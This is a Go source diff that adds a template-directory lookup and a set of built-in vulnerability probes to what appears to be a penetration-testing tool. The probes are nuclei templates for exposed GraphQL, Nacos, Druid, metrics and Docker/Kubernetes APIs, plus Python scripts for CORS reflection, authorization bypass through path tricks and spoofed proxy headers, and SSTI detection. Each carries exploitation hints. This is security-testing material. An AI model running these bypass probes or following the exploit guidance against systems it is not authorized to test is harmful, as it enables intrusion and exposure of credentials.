@@ -25,6 +25,15 @@ func nucleiTemplatesDir() string {
 			return v
 		}
 	}
+	candidates := []string{"/opt/nuclei-templates", "./data/nuclei-templates"}
+	if home, err := os.UserHomeDir(); err == nil && home != "" {
+		candidates = append(candidates, filepath.Join(home, "nuclei-templates"))
+	}
+	for _, dir := range candidates {
+		if info, err := os.Stat(dir); err == nil && info.IsDir() {
+			return dir
+		}
+	}
 	return "/opt/nuclei-templates"
 }
 
@@ -252,6 +261,287 @@ for p in params:
     except Exception as e:
         print(f"probed {p}: err={e}")
 print(f"probes_sent={sent}; poll oob_poll_hits to confirm")
+`,
+		},
+		{
+			Name:            "intranet-graphql-introspection",
+			Kind:            db.PocKindNucleiYAML,
+			Severity:        "low",
+			Tags:            "graphql,introspection,api,intranet",
+			Description:     "Detect GraphQL endpoints with introspection enabled to map internal schemas, queries, and mutations.",
+			ExploitGuidance: "Enumerate returned Query/Mutation types and test sensitive mutations/queries for IDOR and broken authorization.",
+			CreatedBy:       "system",
+			Content: `id: intranet-graphql-introspection
+info:
+  name: GraphQL Introspection Enabled
+  severity: low
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/graphql"
+      - "{{BaseURL}}/api/graphql"
+    headers:
+      Content-Type: application/json
+    body: '{"query":"{__schema{types{name}}}"}'
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words:
+          - '"__schema"'
+          - '"types"'
+        condition: and
+`,
+		},
+		{
+			Name:            "intranet-nacos-unauth-probe",
+			Kind:            db.PocKindNucleiYAML,
+			Severity:        "high",
+			Tags:            "nacos,alibaba,middleware,unauth,intranet",
+			Description:     "Detect exposed Alibaba Nacos APIs (/nacos/v1/cs/configs, /nacos/v1/auth/users) accessible without authentication.",
+			ExploitGuidance: "Check if namespace/config read or user list endpoints return DB/Redis/service credentials without a valid accessToken.",
+			CreatedBy:       "system",
+			Content: `id: intranet-nacos-unauth-probe
+info:
+  name: Alibaba Nacos Unauthenticated API Probe
+  severity: high
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/nacos/v1/console/health/readiness"
+      - "{{BaseURL}}/nacos/v1/ns/instance/list?serviceName=test"
+      - "{{BaseURL}}/nacos/v1/auth/users?pageNo=1&pageSize=10"
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words:
+          - '"pageItems"'
+          - '"hosts"'
+          - 'UP'
+        condition: or
+`,
+		},
+		{
+			Name:            "intranet-druid-monitor-exposure",
+			Kind:            db.PocKindNucleiYAML,
+			Severity:        "medium",
+			Tags:            "druid,java,monitor,unauth,intranet",
+			Description:     "Detect unauthenticated Alibaba Druid SQL/Session monitor console.",
+			ExploitGuidance: "Inspect exposed SQL queries, datasource URIs, and active session IDs from /druid/websession.json or /druid/sql.json.",
+			CreatedBy:       "system",
+			Content: `id: intranet-druid-monitor-exposure
+info:
+  name: Alibaba Druid Monitor Unauthenticated Exposure
+  severity: medium
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/druid/index.html"
+      - "{{BaseURL}}/druid/sql.html"
+      - "{{BaseURL}}/druid/basic.json"
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words:
+          - "Druid Stat Index"
+          - '"ResultCode"'
+        condition: or
+`,
+		},
+		{
+			Name:            "intranet-metrics-prometheus-exposure",
+			Kind:            db.PocKindNucleiYAML,
+			Severity:        "medium",
+			Tags:            "prometheus,metrics,grafana,exposure,intranet",
+			Description:     "Detect unauthenticated /metrics, Prometheus, or Grafana datasource/health endpoints.",
+			ExploitGuidance: "Review exposed /metrics or /api/datasources for internal service topology, versions, and potential backend targets.",
+			CreatedBy:       "system",
+			Content: `id: intranet-metrics-prometheus-exposure
+info:
+  name: Prometheus / Metrics / Grafana Exposure
+  severity: medium
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/metrics"
+      - "{{BaseURL}}/actuator/prometheus"
+      - "{{BaseURL}}/api/datasources"
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words:
+          - "# HELP "
+          - "# TYPE "
+          - '"typeName"'
+        condition: or
+`,
+		},
+		{
+			Name:            "intranet-container-api-unauth",
+			Kind:            db.PocKindNucleiYAML,
+			Severity:        "critical",
+			Tags:            "docker,kubernetes,k8s,container,unauth,intranet",
+			Description:     "Detect unauthenticated Docker Remote API (/version, /containers/json) or Kubernetes API (/api/v1/namespaces).",
+			ExploitGuidance: "Verify read-only cluster/container listing scope first; escalate via kubectl or skills/cloud-k8s-audit within authorized scope.",
+			CreatedBy:       "system",
+			Content: `id: intranet-container-api-unauth
+info:
+  name: Docker / Kubernetes Unauthenticated API Exposure
+  severity: critical
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/version"
+      - "{{BaseURL}}/containers/json"
+      - "{{BaseURL}}/api/v1/namespaces"
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words:
+          - '"ApiVersion"'
+          - '"Namespace"'
+          - '"ImageID"'
+        condition: or
+`,
+		},
+		{
+			Name:            "intranet-cors-arbitrary-origin",
+			Kind:            db.PocKindPythonScript,
+			Severity:        "medium",
+			Tags:            "cors,misconfig,web,intranet",
+			Description:     "Check whether the target reflects an arbitrary Origin with Access-Control-Allow-Credentials: true.",
+			ExploitGuidance: "Only report as a finding when sensitive authenticated endpoints reflect arbitrary Origin + Allow-Credentials: true.",
+			CreatedBy:       "system",
+			Content: `import os, sys, urllib.request
+
+target = os.environ.get("ARTEX_POC_TARGET", "").strip()
+if not target:
+    print("ARTEX_POC_TARGET is required", file=sys.stderr)
+    sys.exit(2)
+
+evil = "https://cors-probe.invalid"
+req = urllib.request.Request(target, method="GET", headers={"Origin": evil, "User-Agent": "ARTEX-CORS-Probe/1.0"})
+try:
+    with urllib.request.urlopen(req, timeout=8) as resp:
+        acao = resp.headers.get("Access-Control-Allow-Origin", "")
+        acac = resp.headers.get("Access-Control-Allow-Credentials", "")
+        print(f"status={resp.status} ACAO={acao!r} ACAC={acac!r}")
+        if acao == evil and acac.lower() == "true":
+            print("CONFIRMED: arbitrary Origin reflected with Allow-Credentials: true")
+            sys.exit(0)
+        sys.exit(1)
+except Exception as e:
+    print(f"probe error: {e}")
+    sys.exit(1)
+`,
+		},
+		{
+			Name:            "intranet-auth-path-header-bypass",
+			Kind:            db.PocKindPythonScript,
+			Severity:        "high",
+			Tags:            "auth-bypass,idor,acl,nginx,spring,intranet",
+			Description:     "Probe common HTTP path normalization (..;/, %2e, trailing slash) and proxy header spoofing (X-Forwarded-For, X-Original-URL) against a protected URL.",
+			ExploitGuidance: "Compare baseline 401/403 status/length against bypass variants; confirm actual business data is returned before reporting.",
+			CreatedBy:       "system",
+			Content: `import os, sys, urllib.parse, urllib.request, urllib.error
+
+target = os.environ.get("ARTEX_POC_TARGET", "").strip()
+if not target:
+    print("ARTEX_POC_TARGET is required", file=sys.stderr)
+    sys.exit(2)
+
+def fetch(url, headers=None):
+    req = urllib.request.Request(url, method="GET", headers=headers or {"User-Agent": "ARTEX-ACL-Probe/1.0"})
+    try:
+        with urllib.request.urlopen(req, timeout=6) as r:
+            body = r.read(1024)
+            return r.status, len(body)
+    except urllib.error.HTTPError as e:
+        return e.code, len(e.read(1024))
+    except Exception:
+        return 0, 0
+
+base_status, base_len = fetch(target)
+print(f"baseline: status={base_status} sample_len={base_len}")
+if base_status not in (401, 403):
+    print("baseline is not 401/403; skipping bypass comparison")
+    sys.exit(1)
+
+u = urllib.parse.urlsplit(target)
+base_origin = f"{u.scheme}://{u.netloc}"
+path = u.path or "/"
+variants = [
+    ("trailing-slash", target.rstrip("/") + "/", {}),
+    ("dot-semicolon", base_origin + "/..;" + path, {}),
+    ("xff-loopback", target, {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"}),
+    ("x-original-url", base_origin + "/", {"X-Original-URL": path, "X-Rewrite-URL": path}),
+]
+hits = 0
+for label, vurl, hdrs in variants:
+    st, ln = fetch(vurl, hdrs)
+    print(f"variant={label} status={st} sample_len={ln}")
+    if st == 200:
+        hits += 1
+sys.exit(0 if hits > 0 else 1)
+`,
+		},
+		{
+			Name:            "intranet-ssti-baseline-probe",
+			Kind:            db.PocKindPythonScript,
+			Severity:        "high",
+			Tags:            "ssti,template,injection,intranet",
+			Description:     "Probe query parameters on the target URL with benign template expressions ({{7*7}}, ${7*7}) and check for evaluated output (49).",
+			ExploitGuidance: "If 49 appears only when the expression is injected (and not in baseline), identify the template engine and verify bounded impact.",
+			CreatedBy:       "system",
+			Content: `import os, sys, urllib.parse, urllib.request
+
+target = os.environ.get("ARTEX_POC_TARGET", "").strip()
+if not target:
+    print("ARTEX_POC_TARGET is required", file=sys.stderr)
+    sys.exit(2)
+
+u = urllib.parse.urlsplit(target)
+qs = urllib.parse.parse_qs(u.query, keep_blank_values=True)
+if not qs:
+    qs = {"q": [""], "name": [""], "template": [""]}
+
+def get_body(url):
+    try:
+        with urllib.request.urlopen(urllib.request.Request(url, headers={"User-Agent": "ARTEX-SSTI-Probe/1.0"}), timeout=6) as r:
+            return r.read(8192).decode("utf-8", errors="ignore")
+    except Exception:
+        return ""
+
+baseline = get_body(target)
+if "918273" in baseline:
+    sys.exit(1)
+
+exprs = ["{{918*1000+273}}", "${918*1000+273}", "#{918*1000+273}"]
+for param in list(qs.keys())[:5]:
+    for expr in exprs:
+        mut = {k: v[:] for k, v in qs.items()}
+        mut[param] = [expr]
+        test_url = urllib.parse.urlunsplit((u.scheme, u.netloc, u.path, urllib.parse.urlencode(mut, doseq=True), ""))
+        body = get_body(test_url)
+        if "918273" in body and expr not in body:
+            print(f"CONFIRMED SSTI candidate on param={param} expr={expr}")
+            sys.exit(0)
+print("no evaluated SSTI marker observed")
+sys.exit(1)
 `,
 		},
 	}
